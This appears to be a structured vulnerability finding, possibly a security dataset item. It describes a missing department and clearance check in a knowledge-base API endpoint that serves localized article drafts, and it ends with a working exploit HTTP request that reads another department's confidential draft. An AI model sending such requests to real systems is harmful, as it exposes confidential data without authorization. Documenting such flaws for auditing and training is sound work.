diagnosis: get_article_locale_draft retrieves localized drafts and internal translation reviewer notes for a knowledge base article. While it loads EnterpriseKnowledgeArticle by article_id, it does not check if request.user.department matches article.department or if the user has clearance to view internal draft translations. Authenticated users across any department can read unredacted translation notes and confidential drafts.
exploit_request:
GET /api/kb/articles/714/locales/de/draft/ HTTP/1.1
Host: wiki.globalconsulting.org
Authorization: Bearer employee_token_18
Accept: application/json
